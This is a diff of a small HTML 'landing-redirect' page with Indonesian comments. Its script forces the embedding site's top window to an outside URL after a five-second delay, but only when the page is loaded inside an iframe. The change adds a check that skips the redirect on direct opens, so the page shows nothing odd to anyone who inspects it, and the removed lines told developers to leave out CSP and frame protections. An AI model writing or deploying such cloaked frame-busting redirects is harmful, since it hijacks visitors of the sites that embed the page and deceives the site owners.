@@ -2,22 +2,27 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>Loading...</title>
-
-  <!-- JANGAN pakai CSP -->
-  <!-- JANGAN pakai X-Frame meta -->
-
+  <title>Landing</title>
 </head>
 <body>
 
-<div style="width:100%;height:100%;background:#f2f2f2"></div>
+<h1>landing-redirect</h1>
 
 <script>
-if (window.self !== window.top) {
+(function(){
+
+  // JANGAN redirect kalau dibuka langsung
+  if (window.self === window.top) {
+    console.log("Direct open, no redirect");
+    return;
+  }
+
+  // Delay WAJIB untuk iframe traffic
   setTimeout(function(){
     window.top.location.href = "https://oversightexcitement.com/bt6678xqp4?key=b4d6bb67a477268e22db1885ae26c970";
   }, 5000);
-}
+
+})();
 </script>
 
 </body>
